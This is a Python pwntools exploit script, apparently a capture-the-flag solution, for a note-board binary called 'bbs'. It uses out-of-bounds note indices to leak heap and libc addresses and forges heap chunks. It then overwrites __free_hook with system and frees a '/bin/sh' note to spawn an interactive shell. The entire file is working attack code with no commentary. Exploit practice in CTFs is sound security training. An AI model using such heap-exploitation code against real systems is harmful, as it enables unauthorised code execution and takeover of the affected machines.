from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./bbs"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil ("==========MENU==========\n")

def menu (idx):
  rr ()
  r.sendline (str(idx))


cmd = """
c
"""
do_debug (cmd)

def write_note (title, body):
  rr ()
  r.send ("w")
  r.sendlineafter(":", title)
  r.send (body + "\x1b")

def read_note (idx):
  rr ()
  r.send ("r")
  r.recvuntil (":")
  r.sendline (str(idx))

def del_note (idx):
  rr ()
  r.send ("d")
  r.recvuntil (":")
  r.sendline (str(idx))

write_note ("/bin/sh", "thisistest\n") 
write_note ("hi", "thisistest\n")
write_note ("hi", "thisistest\n")
write_note ("hi", "thisistest\n")
write_note ("hi", "thisistest\n")
write_note ("hi", "thisistest\n")
write_note ("hi", "thisistest\n")
write_note ("hi", "thisistest\n")
write_note ("hi", "thisistest\n")
write_note ("hi", "thisistest\n")

del_note (1)
del_note (2)
del_note (3)
del_note (4)
del_note (5)
del_note (6)
del_note (7)
del_note (8)

#read_note (-196)
target = (0x5970 - 0x670) /8
num = (target + 2**63) - 2**64
read_note (num)
heap_offset = 0x2830
r.recvuntil ("===================================\n")
heap_leak = u64(r.recvn(6) + "\x00\x00")
heap_base = heap_leak-heap_offset

log.info ("heap_base : " + hex(heap_base))

unsorted_offset = 0x1820
unsorted_target = heap_base + unsorted_offset + 8
fake_note = (heap_base + 0x1920)

pay = p64(fake_note) * 32 + p64(unsorted_target) * 32
write_note ("JOHN", pay)
del_note (1)


target = (0x1840-0x670) / 8
num = (target + 2**63) - 2**64
read_note (num)
libc_offset = 0x3ebca0 # main_arena + 96
r.recvuntil ("-----------------------------------\n")
libc_leak = u64(r.recvn(6) + "\x00\x00")
libc_base = libc_leak-libc_offset
log.info ("libc_base : " + hex(libc_base))

system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]

write_note ("JOHN", pay)
del_note (1)

fake_addr = 0xdeadbeefdeadbeef
fake_offset = 0x6b40
fake_addr = heap_base + fake_offset
fake_note = p64(0) + p64(0x41) + p64 (0) *5 + p64(0x41)

fake_chunk = p64(0) + p64(0x41) + p64(fake_addr) + p64(fake_addr) + p64(0) * 5 + p64(0x41)
fake_chunk += fake_note 

pay = fake_chunk * 30
write_note ("TEST", pay)
write_note ("TEST", pay)
write_note ("TEST", pay)
write_note ("TEST", pay)
write_note ("TEST", pay)
write_note ("TEST", pay)
write_note ("TEST", pay)

del_note (4)

target = (0x6b80-0x680) / 8
num = (target + 2**63) - 2**64
del_note (num)

target = (0x6c10-0x680) / 8
num = (target + 2**63) - 2**64
del_note (num)

write_note ("COMHERE", "A"*0xf0 + p64(free_hook))
write_note (p64(system), "hello")
write_note (p64(system), "hello")
write_note (p64(system), "hello")

del_note (0)


r.interactive ()
